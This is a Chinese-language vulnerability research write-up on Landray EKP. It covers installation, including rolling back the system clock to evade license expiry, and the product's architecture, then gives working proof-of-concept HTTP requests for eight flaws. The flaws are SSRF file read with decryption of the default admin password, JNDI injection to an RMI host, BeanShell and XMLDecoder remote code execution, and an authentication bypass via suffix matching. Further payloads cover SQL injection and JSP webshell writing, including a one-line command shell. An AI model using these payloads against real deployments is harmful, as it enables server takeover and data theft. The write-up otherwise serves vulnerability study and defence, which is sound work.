# 蓝凌EKP

## 环境安装
1. 安装 MySQL 或 SQL Server 数据库，创建一个名为 ekp 的数据库，字符集需要设置为 UTF-8
2. 获取安装文件：linux64.zip，ekp.zip，将二者解压后放在同一目录下，例如 `C:\Users\Administrator\Desktop\v15\` 下，注意安装目录不要有空格
3. Windows 下需要自己安装 JDK7/8，并配置 `JAVA_HOME` 环境变量
4. 修改系统时间至 2021-04-26 之前（根据自身 Landray 的授权截止时间更改）
5. 复制 ekp 文件夹中 `web-safe.xml` 的内容至 `web.xml`。（直接覆盖）
6. 切到目录的 `\linux64\tomcat\bin` ，命令行执行 `.\catalina.bat run` 启动服务器
7. 服务成功启动后访问 http://ip:8080/ekp/admin.do ，页面的密码为 `Password1`（这个密码位于`/ekp/WEB-INF/KmssConfig/admin.properties`）
8. 根据前面配置的数据库，更改数据库连接 url（将服务器地址 landray.com.cn 换成本机的，如 127.0.0.1），测试数据库连接。另外，可修改附件存放地址，默认为 `C:\landray\kmss\resource`。修改完页面配置后，点击保存，会要求重启服务器
9. 重启服务器之前，复制 ekp 文件夹中的 `web-normal.xml` 至 `web.xml`（此处需要注意，更改了第五步中的 web.xml ，否则启动失败）。然后再执行 `.\catalina.bat run` 启动服务器
10. 重启成功后，访问 `http://ip:8080/ekp/sys/profile/index.jsp`，登陆的默认用户名密码为：`admin 1`，然后系统会要求更改 `1` 这个过于简单的密码
11. 访问 `http://ip:8080/ekp/sys/profile/index.jsp` 进入蓝凌后台，选择「运维管理-管理员工具箱-系统初始化」，进行系统初始化操作
12. 如果想要调试蓝凌 EKP 的代码，可以在服务器启动时使用命令 `.\catalina.bat jpda start` 启动服务器，默认的监听端口为 8000

## 架构分析

### ssh架构
蓝凌采用SSH架构（Struts2+Spring+Hibernate）。层次结构为`View层 -> Controller层 -> Service层 -> Dao层 -> Model层`。这些在蓝凌的源码功能模块文件夹结构也有体现

文件夹结构尤其要注意（1）源码位于`/ekp/WEB-INF/classes/com/landray/kmss` （2）配置文件位于`/ekp/WEB-INF/KmssConfig`文件夹下

<details>
    <summary>蓝凌文件夹结构</summary>
    <pre>
    <code>
ekp
 |- component (功能模块，包含jsp文件)
 |- dbcenter
 ...
 |- sys
 ...
 |- WEB-INF
     |- classes ( * 源码  com.landray.kmss)
	|- 某功能子模块
	    |- actions
	    |- dao
	    |- forms
	    |- model
	    |- plugin
 	    |- service
             ...
	    |- util
     |- dic (数据字典 .dic)
     |- KmssConfig ( * 各功能模块的配置，包含xml文件)
     |- lib (库)
     |- patch (补丁)
     |- templates (模板，.ftl)
     |- 各类.tld文件
     |- web.xml
     |- web-normal.xml
     |- web-safe.xml
    </code>
    </pre>
</details>


**请求执行流程**

发起请求时，会先经过Tomcat的ApplicationFilterChain链条进行过滤（包含Spring Security相关的Filter、编码相关Filter等），访问xx.jsp，然后Spring的DispatcherServlet根据spring-mvc.xml将请求转到对应的Action类进行处理，处理过程中调用Service层的方法。方法中用到的数据实体都位于Dao层。Service层和Dao层的定义都在spring.xml文件中。数据值则是通过Hibernate，完成对数据库的curd（增删改查）操作。

**Hibernate配置**

`/ekp/WEB-INF/web.xml`中可以看到配置了`OpenSessionInViewFilter`，该类将Hibernate Session绑定到请求线程中便于Spring管理，也就是表明架构采用了Hibernate。Hibernate是一种ORM（Objcet Relative Mapping-对象关系映射）的框架。对象的映射关系文件名为`xx.hbm.xml`，和类对象放在同一个文件夹下。

以KmsKcubeTmplCfg类为例，查看它的映射关系
```java
public class KmsKcubeTmplCfg extends BaseModel {
    private static ModelToFormPropertyMap toFormPropertyMap;
    private String fdKey;
    private Integer fdType;
    ...
}
```
KmsKcubeTmplCfg.hbm.xml内容如下
```xml
<hibernate-mapping>
    <class 
        name="com.landray.kmss.kms.kcube.model.KmsKcubeTmplCfg"  <! --类名-->
        table="kms_kcube_tmpl_cfg"> <! --表名-->
        <id               <!--主键映射，属性名为fdId，列名为fd_id-->
            name="fdId"  
            column="fd_id" 
            length="36"/>
        <property 
            name="fdKey"  <!--非主键映射，属性名为fdKey，列名为fd_key-->
            column="fd_key" 
            update="true" 
            insert="true" 
            length="200"
            not-null="true" />
        <property 
            name="fdType" 
            column="fd_type" 
            update="true" 
            insert="true"
            not-null="true" />
        ...
    </class>
</hibernate-mapping>
```

### 路由分析
*   （1）jsp路由为jsp所在位置到ekp目录之前的相对路径，例如`/ekp/sys/common/dataxml.jsp`
*   （2）Controller访问路由，Controller命名为`xxController`、`xxAction`，可以在每个功能目录的`actions`文件夹下查找。然后在KmssConfig文件夹该功能对应的配置文件spring-mvc.xml（有些版本蓝凌用的struts.xml）中查找类与jsp的对应关系，和类的访问路径。
*   （3）安全管理用了SpringSecurity。web.xml中配置了SpringSecurity的一个Filter，相关定义位于`sys\authentication\spring.xml`。`/ekp/WEB-INF/KmssConfig/sys`下实际存在两个关于SpringSecurity的配置——Authentication（认证）和Authorization（授权）文件夹
```
    <filter>
        <!-- 'springSecurityFilterChain' is a bean ID that declared in sys\authentication\spring.xml  -->  
        <filter-name>springSecurityFilterChain</filter-name>  
        <filter-class>com.landray.kmss.web.filter.SpringSecurityFilterToBeanProxy</filter-class>  
    </filter> 
```
Authentication下的spring.xml，Bean对象的name为`springSecurityFilterChain`和Filter的配置相对应。静态资源通过resourceCacheFilter。其他的资源要通过xml文件中列出的六个Filter
```xml
<bean id="org.springframework.security.filterChainProxy" 
        name="springSecurityFilterChain"
        class="org.springframework.security.web.FilterChainProxy">
        <constructor-arg>
             <list value-type="org.springframework.security.web.SecurityFilterChain">
                <!-- 静态资源，加有效期|版本号 -->
                <sec:filter-chain pattern="/**/*.gif" filters="resourceCacheFilter" />
                <sec:filter-chain pattern="/**/*.jpg" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.png" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.bmp" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.ico" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.css" filters="resourceCacheFilter,gzipFilter" />
                <sec:filter-chain pattern="/**/*.js" filters="resourceCacheFilter,gzipFilter" />  
                <sec:filter-chain pattern="/**/*.tmpl" filters="resourceCacheFilter,gzipFilter" />  
                <sec:filter-chain pattern="/**/*.html" filters="gzipFilter" />
                <!-- RestApi的过滤，由于使用不同的认证方式和非会话管理，所以独立一条链路 restApiAuthFilter-->
                <sec:filter-chain pattern="/api/**" filters="restApiAuthFilter" />
                <!-- 其它资源 kmssSessionManagerFilter -->
		<!-- 操作日志过滤器sysLogOperFilter、 -->
                <sec:filter-chain  pattern="/**"
                    filters="securityContextPersistenceFilter,
                    sysLogOperFilter, 
                    concurrentSessionFilter,
                    kmssProcessingFilterProxy,
                    exceptionTranslationFilter,
                    filterInvocationInterceptor" />
             </list>
         </constructor-arg>
</bean>
```
filterInvocationInterceptor中也定义了一些匿名路径
```
/login*.jsp*; 
/resource/**; 
/service/**; 
/ui-ext/**; 
/*/*.index; 
/logout*; 
/admin.do*; 
/browser.jsp*;
/axis/*; 
/kk*; 
/forward.html*; 
/sys/webservice/*; 
/vcode.jsp;
/sys/authentication/validate*;
/ui-ext/scormcourse/**;
/*.txt;
/sys/print/word/file/**;
/elec/rmkk/rmkk.do*;
/elec/yqq/callback.do*;
/sys/person/image.jsp*;
/elec/sgt/callback.do*;
```

## 已知漏洞
 - [1.custom.jsp文件读取漏洞](#custom文件读取)
 - [2.admin.do jndi漏洞](#jndi攻击admin)
 - [3.BeanShell漏洞](#利用beanshell进行攻击)
 - [4.jsp未授权访问漏洞](#jsp未授权访问)
 - [5.XMLdecoder反序列化漏洞](#xmldecoder反序列化)
 - [6.debug.jsp写文件漏洞](#debug_jsp写文件)
 - [7.kmImeetingRes.do sql注入漏洞](#kmimeetingres_sql注入)
 - [8.sysPortalPortlet.do Porlet文件写入漏洞](#sysportalportletdo-porlet文件写入漏洞)

|漏洞名称|访问路径|漏洞定位|
|:---:|:---:|:---:|
|custom.jsp文件读取漏洞|`/ekp/sys/ui/extend/varkind/custom.jsp`|由jsp `<c:import>`引起的SSRF|
|admin.do jndi漏洞|`/ekp/admin.do`|——|
|BeanShell漏洞|`/ekp/sys/common/dataxml.jsp`等|`FormulaParser#parseValueScript`|
|/data和/api未授权访问漏洞|`/ekp/data/sys-common/dataxml.js`|`/sys/authentication/spring.xml`|
|XMLdecoder反序列化漏洞|`/sys/search/sys_search_main/sysSearchMain.do?method=editParam`|`/util/ObjectXML.class`|
|debug.jsp写文件漏洞|`/ekp/sys/common/debug.jsp`|直接将接收参数写入到了code.jsp|
|kmImeetingRes.do sql注入漏洞|`/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do`|——|
|sysPortalPortlet.do Porlet文件写入漏洞|`/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do`|——|


### custom文件读取
custom.jsp文件内容如下
```jsp
<%@page import="com.landray.kmss.util.ResourceUtil"%>
<%@page import="net.sf.json.JSONArray"%>
<%@page import="net.sf.json.JSONObject"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%
	JSONObject vara = JSONObject.fromObject(request.getParameter("var"));
	JSONObject body = JSONObject.fromObject(vara.get("body"));
	if(body.containsKey("file")){
%>
<c:import url='<%=body.getString("file") %>' charEncoding="UTF-8">
	<c:param name="var" value="${ param['var'] }"></c:param>
</c:import>
<% }%>
```
其中的两个jsp标签`<c:import>`和`<c:param>`。`<c:import>`用于请求本地或远程数据/文件，其中必须要传入url参数，url可以是相对路径和绝对路径。`<c:param>`用于指定url的参数

也就是标签部分存在两个值，一个是url，另外一个是加参数后的url。如果传入的url和param如下，那么加参数后的url为`http://a.com?id=test`，会向这个url发起请求，造成SSRF。
```
<c:import url="http://a.com" > 
<c:param name="id" value="test" /> 
</c:import>
```

然后看一下poc，访问路径就是jsp文件在ekp文件夹下的绝对路径，POST的内容需要符合JSON格式，赋值给参数var。通过SSRF利用file协议来读取文件
```
POST /ekp/sys/ui/extend/varkind/custom.jsp
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
```
这样poc经过jsp，url和url加上var参数的值分别如下。也这是为什么url后需要一个`#`来截断（Windows下），以正常读取url对应的文件，否则会报错file not found。
```
url=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#

urlWithParams=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#?var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
```
读取admin.properties文件，内容如下，其中password是DES加密的
```
password = Ac6OXgTtn4AqNRCxWmSwhg==\r
kmss.properties.encrypt.enabled = true
```
通过在线DES解密网站：http://tool.chacuo.net/cryptdes, 在密码处填入默认密钥`kmssAdminKey`，和待解密的文本`Ac6OXgTtn4AqNRCxWmSwhg==`，进行DES解密后得到
```
Password1
```

### jndi攻击admin
通过customs.jsp得到admin的密码`Password1`，用这个密码可以登陆`http://ip:8080/ekp/admin.do`，然后在系统配置的数据库配置中选择JNDI，页面会多出一行数据源名称的选项，填入`rmi://172.16.165.1:1099/lpkz0d`，点击测试按钮成功执行。拦截的数据包内容如下
```
POST /ekp/admin.do HTTP/1.1
Content-Type: application/x-www-form-urlencoded

method=testDbConn&datasource=rmi%3A%2F%2F172.16.165.1%3A1099%2Flpkz0d
```

### 利用beanshell进行攻击
BeanShell漏洞在国产化软件中很常见，泛微OA、用友NC等都出现过BeanShell漏洞。BeanShell可以在运行时动态执行Java代码，在应用程序的开发中提供很好的可扩展性。其对应的jar包名为`bsh-2.0b4.jar`，只要在lib中看到此jar包都可以查找其相关的入口。最终bsh执行java代码的示例如下
```
Interpreter interpreter = new Interpreter();
Object object=interpreter.eval("exec(\"whoami\")");
```
在蓝凌的`/ekp/WEB-INF/class`的源码中搜索形如上述代码存在的类
```
com.landray.kmss.sys.formula.parser.FormulaParser#parseValueScript
com.landray.kmss.sys.iassister.util.FormulaUtil#parseValueScript
com.landray.kmss.sys.lbpmservice.node.robotnode.support.RobotNodeRunScriptServiceImp#execute
com.landray.kmss.sys.modeling.base.util.ModelingFormulaUtil#parseValueScript
com.landray.kmss.sys.rule.parser.RuleEngineParser#parseValueScript
com.landray.kmss.tic.core.cacheindb.util.ToolUtil#transDataByImpl
com.landray.kmss.tic.sap.sync.service.spring.TicSapSyncUniteQuartzService#findDeleteField
```
上述很多类的执行方法为`parseValueScript()`，查找该方法在web目录下的调用类，包括
* `SysFormulaValidate`
* `SysFormulaValidateByJS`
* `SysFormulaValidateByScriptEngine`
* `SysFormulaSimulateByJS`
* `SysFormulaSimulate`
* `RuleFormulaValidate`

（这些类都实现了IXMLDataBean接口），并且这些类对`parseValueScript()`的调用方法都是`getDataList(RequestContext requestInfo)`。查找调用`getDataList()`方法的类，发现存在一个Controller——`com.landray.kmss.common.actions.DataController`，这个Controller标注的路由为`/data/sys-common`。并且在`datajson()、dataxml()、treexml()`等方法中都调用了`getDataList()`
```java
@RequestMapping(value = {"datajson"}, produces = {"application/json;charset=UTF-8"})
  @ResponseBody
  public RestResponse<JSONArray> datajson(HttpServletRequest request, HttpServletResponse response) throws Exception {
    String s_bean = request.getParameter("s_bean");
    JSONArray array = new JSONArray();
    JSONArray jsonArray = null;
    try {
      Assert.notNull(s_bean, ");
      RequestContext requestInfo = new RequestContext(request, true);
      String[] beanList = s_bean.split(";");
      List result = null;
      for (int i = 0; i < beanList.length; i++) {
        IXMLDataBean treeBean = (IXMLDataBean)SpringBeanUtil.getBean(beanList[i]); // s_bean的值对应某个实现自IXMLDataBean接口的类
        result = treeBean.getDataList(requestInfo); // 触发getDataList
	...
}
```
另外，发现类似的代码也出现在jsp文件中，如dataxml.jsp、datajson.jsp、treexml.jsp等
```jsp
<%@ page import="org.springframework.context.ApplicationContext,
	org.springframework.web.context.support.WebApplicationContextUtils,
	com.landray.kmss.common.service.IXMLDataBean,
	com.landray.kmss.common.actions.RequestContext,
	com.landray.kmss.util.StringUtil,
	org.apache.commons.lang.StringEscapeUtils,
	java.util.*
"%>
RequestContext requestInfo = new RequestContext(request);
String[] beanList = request.getParameter("s_bean").split(";");
IXMLDataBean treeBean;

sout.append("<dataList>");
for(i=0; i<beanList.length; i++){
    treeBean = (IXMLDataBean) ctx.getBean(beanList[i]);
    nodes = treeBean.getDataList(requestInfo);
    ...
}
```
最终搜索到的能触发BeanShell的路径如下（如果是通过customs.jsp访问其他jsp文件，则不需要`/ekp/`前缀路径）
```
/ekp/sys/common/dataxml.jsp
/ekp/sys/common/datajson.jsp
/ekp/sys/common/treexml.jsp
/ekp/sys/common/treejson.jsp
/ekp/data/sys-common/dataxml
/ekp/data/sys-common/datajson
/ekp/data/sys-common/treexml
```
发送的请求数据包如下
```
POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"/sys/common/dataxml.jsp"}}&s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc")&type=int&modelName=test
```

需要注意是对于SysFormulaSimulate，需要加一个model参数
```
GET /ekp/data/sys-common/dataxml.gif?s_bean=sysFormulaSimulate&script=Runtime.getRuntime().exec("calc")&model=com.landray.kmss.km.smissive.model.KmSmissiveNumber HTTP/1.1
Host: 10.211.55.3:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Accept: */*
Referer: http://10.211.55.3:8080/ekp/sys/portal/page.jsp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-Modified-Since: Sat, 10 Oct 2020 07:35:12 GMT
Connection: close
```

`model`所指的类，需要实现`IExtendDataModel`或者`IBaseCreateInfoModel`接口。

与之类似的还有erp_data.jsp，但它的接受bean的参数为`String service=request.getParameter("erpServcieName");`，发送请求时只需要将上述的s_bean换为erpServcieName
```
/tic/core/resource/js/erp_data.jsp
```
数据包script的内容可以将恶意代码进行unicode转码，防止字符被转译。

此外搜索getDataList，还发现了以下路由
```
/sys/lbpmdocking/resource/jsp/datajson.jsp
```
同时以`SysFormulaSimulate`为线索了，发现了一个接口`IRuleProvider`它的实现类有两个
* DockingRuleProvider
* FormulaRuleProvider



### jsp未授权访问
BeanShell攻击中用到的jsp文件都是需要访问权限的，其访问路径均为`/ekp/sys/common/xx.jsp`，对应的配置文件为`/ekp/WEB-INF/KmssConfig/sys/authentication/spring.xml`，具体内容可以看文章安全管理部分。对于`.gif .jpg .png .bmp .ico .css .js .tmpl .html`这些静态资源都采用resourceCacheFilter进行过滤，但是该过滤器没有权限校验过程。所以可以访问静态资源来绕过权限校验。但是为什么dataxml.jsp可以通过dataxml.js来访问？

主要由于Spring的useSuffixPatternMatch机制。该值默认为true，会启用后缀模式匹配，假如一个Controller映射的是`/user`，那么Spring在开启useSuffixPatternMatch机制时，会匹配`/users.*`。Spring对于useSuffixPatternMatch的处理过程展开如下
<details>
    <summary>useSuffixPatternMatch处理位置</summary>
    <pre>
    <code>
private String getMatchingPattern(String pattern, String lookupPath) { // PatternsRequestCondition类
    if (pattern.equals(lookupPath)) {
        return pattern;
    }　　　　
    if (this.useSuffixPatternMatch) {//useSuffixPatternMatch默认为true
        if (!this.fileExtensions.isEmpty() && lookupPath.indexOf('.') != -1) {
	    for (String extension : this.fileExtensions) {
	        if (this.pathMatcher.match(pattern + extension, lookupPath)) {
		    return pattern + extension;
	        }
	    }
        }
        else {
	    boolean hasSuffix = pattern.indexOf('.') != -1;
	    if (!hasSuffix && this.pathMatcher.match(pattern + ".*", lookupPath)) {
	        return pattern + ".*"; //这里返回了login.*
	    }
        }
    }
    if (this.pathMatcher.match(pattern, lookupPath)) {
        return pattern;
    }
    if (this.useTrailingSlashMatch) {
        if (!pattern.endsWith("/") && this.pathMatcher.match(pattern + "/", lookupPath)) {
	    return pattern +"/";
        }
    }
    return null;
}
    </code>
    </pre>
</details>
 

所以可以不通过custom.jsp的方式来访问这些jsp，可以采用更改jsp文件后缀的方式，例如想要访问dataxml.jsp，可以将其改为访问dataxml.js或者dataxml.tmpl等方式
```
POST /ekp/data/sys-common/dataxml.js HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded

s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc.exe");
```
Ps: 如果要关闭后缀匹配，可以配置如下
```xml
<mvc:annotation-driven>
     <!-- 是否在匹配模式时使用后缀模式匹配(" .*") 如果启用了映射到“/users”的方法，则匹配到“/users.*”。默认为true-->
      <mvc:path-matching suffix-pattern="false" />
</mvc:annotation-driven>
```

### xmldecoder反序列化
XMLDecoder是**JDK自带**的处理XML文档的类库，将xml格式反序列化为Java对象。与之对应的序列化类为XMLEncoder。XMLDecoder反序列化基础用法如下
```
XMLDecoder xmlDecoder = xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
Object o = xmlDecoder.readObject();
```
以`/ekp/WEB-INF/KmssConfig/sys/search/spring-mvc.xml`为例，xml内容如下
```xml
<bean
	name="/sys/search/sys_search_main/sysSearchMain.do"
	class="com.landray.kmss.sys.search.actions.SysSearchMainAction"
	lazy-init="true"
	parent="KmssBaseAction">
	<property
		name="formType"
		value="com.landray.kmss.sys.search.forms.SysSearchMainForm" />
	<property name="forwards">
		<map>
			<entry
				key="view"
				value="/sys/search/sys_search_main/sysSearchMain_view.jsp" />
			...
			<entry
				key="editParam"
				value="/sys/search/sys_search_main/sysSearchMain_param.jsp" />
		</map>
	</property>
</bean>
```
攻击数据包如下
```
POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void class="bsh.Interpreter"><void method="eval"><string>Runtime.getRuntime().exec("calc");</string></void></void></java>
```


### debug_jsp写文件
漏洞位于`/ekp/sys/common/debug.jsp`，fdCode传入的内容会直接写入到`<" + "% " + code + " %" + ">";`code的位置，然后将这段jsp代码写入到`/sys/common/code.jsp`中
```
<%
    String code = request.getParameter("fdCode");
    if(code!=null){
        code = "<"+"%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\""+ " pageEncoding=\"UTF-8\"%"+"><" + "% " + code + " %" + ">";
        FileOutputStream outputStream = new FileOutputStream(ConfigLocationsUtil.getWebContentPath()+"/sys/common/code.jsp");
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
	bw.write(code);
	bw.close();
%>
```
Java最简单的一句话木马如下，现在debug.jsp提供了木马两侧的格式`<% code %>`，只需要将木马内容填入，即可将code.jsp变成一个恶意木马
```
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### kmimeetingres_sql注入

注入点为orderby，访问路径如下：
```
/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
```
在`KmssConfig/km/imeeting/spring-mvc.xml`查找KmImeetingRes.do的对应类为KmImeetingResAction，method为listUse，请求入口为KmImeetingResAction#listUse，实际的方法处理为`KmImeetingResServiceImp.class#listUse`，方法的大致内容如下（所以这个sql注入的前提是km_imeeting_main表中是需要有数据的）
```java
public Page listUse(RequestContext requestContext) throws Exception {
    String s_pageno = requestContext.getParameter("pageno");
    String s_rowsize = requestContext.getParameter("rowsize");
    ...
    int total = this.getListUseTotal(requestContext); // 先从km_imeeting_main表中查数据，这个sql没有输入点
    if (total > 0) {
        ...
        SQLQuery sqlQuery = this.getUseSQLQuery(requestContext); // 执行sql
    }
}
```
在getUseSQLQuery方法中，sql的拼接省略如下。也就是sql命令`select something from order by xxx desc`。其中`xxx`是可控的
```java
private SQLQuery getUseSQLQuery(RequestContext requestContext) {
    String sql = "select * from ";
    sql = sql + "select m.fd_id as fdId ... from km_imeeting_main where m.doc_creator_id=pa.fd_id union select b.fd_id as fdId from km_imeeting_book where b.doc_creator_id=pb.fd_id total";
    String orderby = requestContext.getParameter("orderby");
    String ordertype = requestContext.getParameter("ordertype");
    if (ordertype != null && ordertype.equalsIgnoreCase("down")) {
        orderby = orderby + " desc";
    }
    if (StringUtil.isNotNull(orderby)) {
        sql = sql + " order by " + orderby;
    } else {
        sql = sql + " order by fdHoldDate desc";
    }
    SQLQuery sqlQuery = this.getBaseDao().getHibernateSession().createSQLQuery(sql);
}
```
orderby参数注入的一些payload
```
orderby=1 and (select 8320 from(select select(sleep(5)))JcSn)
orderby=1;WAITFOR DELAY '0:0:5'--
```

### sysPortalPortlet.do Porlet文件写入漏洞

访问路径为

```
/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=
```

此接口至少需要普通用户权限才可访问，它可根据`config`的配置内容，生成一个`jsp`文件，并将请求的内容转发至该`jsp`处理。

下面这个Poc通过闭合标签`ui:tabpanel`的方式写入了自定义内容

```http
GET /ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%32%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d HTTP/1.1
Host: 10.211.55.3:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
DNT: 1
Cookie: JSESSIONID=E0B865E92585A0FAC240CBC6B0D1EF22; LRToken=6bb730313adae9c8b3c73c57bb8397b53d5bda560086c31b09aa4c283b95b022bc4b3f59053eb885d9c728a642bbe67f4357cc445743389ad06cd3c4bda5a765f0c84412a4c97be120a07759493acf9e1445bfc6bbe165e77232695b41fbce97cb9234f72391c9533c2ba7e2c1754ee5ca1eb37fad5a17d05137ab76e153a3d2
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
If-Modified-Since: Fri, 09 Oct 2020 06:18:33 GMT
Connection: close
```

其中config的内容如下

```json
{
"panel":"tabpanel",
"panelType":"h",
"layoutId":"",
"height":"1\"></ui:tabpanel>2<ui:tabpanel height=\"1",
"layoutOpt":{},
"portlet":[]
}
```

或者写入一句话木马，并打开计算器。

```http
GET /ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do?method=genHtml&config=%7b%0a%22%70%61%6e%65%6c%22%3a%22%74%61%62%70%61%6e%65%6c%22%2c%0a%22%70%61%6e%65%6c%54%79%70%65%22%3a%22%68%22%2c%0a%22%6c%61%79%6f%75%74%49%64%22%3a%22%22%2c%0a%22%68%65%69%67%68%74%22%3a%22%31%5c%22%3e%3c%2f%75%69%3a%74%61%62%70%61%6e%65%6c%3e%3c%25%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%5c%22%69%5c%22%29%29%3b%25%3e%3c%75%69%3a%74%61%62%70%61%6e%65%6c%20%68%65%69%67%68%74%3d%5c%22%31%22%2c%0a%22%6c%61%79%6f%75%74%4f%70%74%22%3a%7b%7d%2c%0a%22%70%6f%72%74%6c%65%74%22%3a%5b%5d%0a%7d&i=calc HTTP/1.1
Host: 10.211.55.3:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
DNT: 1
Cookie: JSESSIONID=2E84DEC027062EC4274B66A53ED10089; LRToken=5832b4e18cadebe86ce093937241a860d70fcee6768f0521376b94ee4113df46c8e4867ca509f2971b726b8ef179f972b7c695e9bd9f616d2842a8f9c8811a5108c5a9acb316c8760d1fa39d929b97a7c40651b9cb578ed809bd99f7b69350fda2ca9c1b12e4fce32d95bde575baa6a9c15c32f13d0a02972d16db7465b7b108
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
If-Modified-Since: Fri, 09 Oct 2020 06:18:33 GMT
Connection: close
```

漏洞的利用只需构造满足`com.landray.kmss.sys.portal.util.DesignUtil#createPortlet`需求的数据即可。并通过闭合其它标签来写入自定义内容

```java
} else if (config.getString("panel").equalsIgnoreCase("tabpanel")) {
    String panelType = config.getString("panelType");
    if (panelType.equalsIgnoreCase("v")) {
        in = new JspElement(Tag.valueOf("ui:accordionpanel"), "");
    } else {
        if (!panelType.equalsIgnoreCase("h")) {
            throw new Exception("类型错误");
        }

        in = new JspElement(Tag.valueOf("ui:tabpanel"), "");
        if (StringUtil.isNotNull((String)config.get("height"))) {
            in.attr("height", config.getString("height"));
        }

        if (StringUtil.isNotNull((String)config.get("heightExt"))) {
            if (config.getString("heightExt").equals("scroll")) {
                in.attr("scroll", "true");
            }

            if (config.getString("heightExt").equals("auto")) {
                in.attr("scroll", "false");
            }
        }
    }
```

文件写入的路径是固定的，但文件名随机（日期加随机数）。
```
ekp/sys/portal/designer/page/20201020052353_17542bf489fff95ee5c04804b6b9a376.jsp
```
